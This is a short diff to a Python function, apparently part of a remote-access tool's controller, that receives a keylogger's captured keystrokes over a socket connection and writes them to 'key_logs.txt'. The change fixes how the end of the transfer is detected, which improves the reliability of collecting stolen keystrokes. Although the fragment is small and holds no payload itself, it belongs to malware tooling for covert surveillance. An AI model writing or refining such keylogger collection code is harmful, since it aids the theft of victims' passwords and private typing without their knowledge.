@@ -52,7 +52,7 @@ def transfer(conn,command):
     f = open('key_logs.txt','wb')
     while True:  
         bits = conn.recv(1024)
-        if bits.endswith(b'DONE'):
+        if b'DONE' in bits:
             time.sleep(2)
             print('[-] Keylogger terminated completed')
             print('[+] Keylogger file received')
